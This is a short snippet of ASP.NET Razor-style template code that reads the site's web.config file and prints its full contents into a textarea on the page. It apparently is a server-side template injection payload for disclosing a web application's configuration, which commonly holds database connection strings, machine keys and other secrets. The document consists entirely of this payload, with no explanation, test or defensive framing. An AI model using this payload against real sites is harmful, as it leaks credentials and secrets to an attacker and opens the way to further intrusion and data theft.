@{
echo("<textarea rows='20' cols='80'>");

var file = System.IO.File.ReadAllText(Server.MapPath("~/web.config"));

echo(file.Replace(">","&gt;").Replace("<","&lt;"));

echo("</textarea>");

return "";
}@